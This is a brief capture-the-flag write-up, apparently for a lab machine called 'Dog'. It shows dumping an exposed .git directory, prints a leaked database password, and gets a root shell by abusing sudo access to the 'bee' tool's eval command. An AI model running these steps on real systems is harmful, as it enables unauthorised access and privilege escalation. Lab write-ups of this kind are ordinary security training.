# Dog - Backdrop / sudo bee

**Found .git**

```bash
git-dumper http://10.10.11.58/.git giter
```

**Found tiffany user's creds**

```php
$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';
$database_prefix = '';
```

**Shell as www-data** via Backdrop CMS exploit.

**Shell as johncusack**

```bash
sudo -l
```

[image]

bee нь php eval function ашиглах боломжтой.

### Shell as root

```bash
cd /var/www/html
sudo /usr/local/bin/bee ev 'system("id")';
```

[image]
